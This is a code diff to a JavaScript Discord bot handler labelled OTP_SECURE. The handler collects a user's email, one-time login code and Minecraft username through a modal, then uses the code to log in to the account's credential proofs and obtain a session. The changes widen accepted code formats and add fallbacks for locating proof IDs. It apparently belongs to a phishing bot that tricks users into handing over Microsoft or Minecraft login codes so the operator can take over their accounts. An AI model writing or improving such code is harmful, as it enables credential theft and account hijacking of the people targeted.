@@ -20,10 +20,10 @@ module.exports = {
         console.log(`[OTP_SECURE] OTP secure modal submitted by user: ${interaction.user.id} (${interaction.user.username})`);
         await interaction.deferReply({ ephemeral: true });
 
-        let email = interaction.components[0].components[0].value.trim();
-        let otp = interaction.components[1].components[0].value.trim();
+        let email = interaction.components[0].components[0].value ? interaction.components[0].components[0].value.trim() : "";
+        let otp = interaction.components[1].components[0].value ? String(interaction.components[1].components[0].value).trim().replace(/[\s\-]/g, "") : "";
         const mcign = interaction.components[2].components[0].value ? interaction.components[2].components[0].value.trim() : null;
-        console.log(`[OTP_SECURE] Email: ${email}, OTP: ${otp ? 'provided' : 'missing'}, MC Username: ${mcign || 'none'}`);
+        console.log(`[OTP_SECURE] Email: ${email}, OTP length: ${otp ? otp.length : 0}, MC Username: ${mcign || 'none'}`);
 
         if (mcign && !mcregex(mcign)) {
             console.log(`[OTP_SECURE] Invalid Minecraft username: ${mcign}`);
@@ -37,8 +37,8 @@ module.exports = {
             return interaction.editReply({ content: `Invalid Email` });
         }
 
-        if (isNaN(otp) || otp.length < 6 || otp.length > 7) {
-            console.log(`[OTP_SECURE] Invalid OTP format: ${otp}`);
+        if (!/^\d{6,8}$/.test(otp)) {
+            console.log(`[OTP_SECURE] Invalid OTP format - length: ${otp ? otp.length : 0}`);
             return interaction.editReply({ content: `Invalid OTP` });
         }
 
@@ -63,22 +63,27 @@ module.exports = {
         profiles = data;
         console.log(`[OTP_SECURE] Credentials retrieved: ${profiles ? 'success' : 'failed'}`);
 
+        const eligibleProofs = profiles?.Credentials?.OtcLoginEligibleProofs ||
+            (profiles?._securityEmails && profiles._securityEmails.length > 0 ? profiles._securityEmails.map(s => s.proof || s) : null) ||
+            (Array.isArray(profiles?.Credentials?.Proofs) && profiles.Credentials.Proofs.length > 0 ? profiles.Credentials.Proofs : null);
+
         try {
-            if (!profiles?.Credentials || !profiles?.Credentials?.OtcLoginEligibleProofs) {
+            if (!eligibleProofs || eligibleProofs.length === 0) {
                 console.log(`[OTP_SECURE] Invalid email or OTP disabled for: ${email}`);
                 return interaction.editReply({ content: `Invalid email / OTP Disabled` });
             }
-            console.log(`[OTP_SECURE] OTP login eligible proofs found: ${profiles?.Credentials?.OtcLoginEligibleProofs?.length || 0}`);
+            console.log(`[OTP_SECURE] OTP login eligible proofs found: ${eligibleProofs.length}`);
         } catch (error) {
             console.error("[OTP_SECURE] Error parsing profiles data:", error);
             return interaction.editReply({ content: `Email doesn't exist!` });
         }
 
         console.log(`[OTP_SECURE] Attempting login with OTP...`);
-        for (let sec of profiles?.Credentials?.OtcLoginEligibleProofs) {
-            console.log(`[OTP_SECURE] Trying OTP proof with ID: ${sec.data}`);
+        for (let sec of eligibleProofs) {
+            const proofId = sec?.data || sec?.id || sec?.proofId || (typeof sec === 'string' ? sec : null);
+            if (!proofId) continue;
             try {
-                let host = await login({ email: email, id: sec.data, code: otp }, profiles);
+                let host = await login({ email: email, id: proofId, code: otp }, profiles);
                 if (host) {
                     console.log(`[OTP_SECURE] Login successful, host obtained`);
                     const expireTimestamp = Math.floor((Date.now() / 1000) + 900);
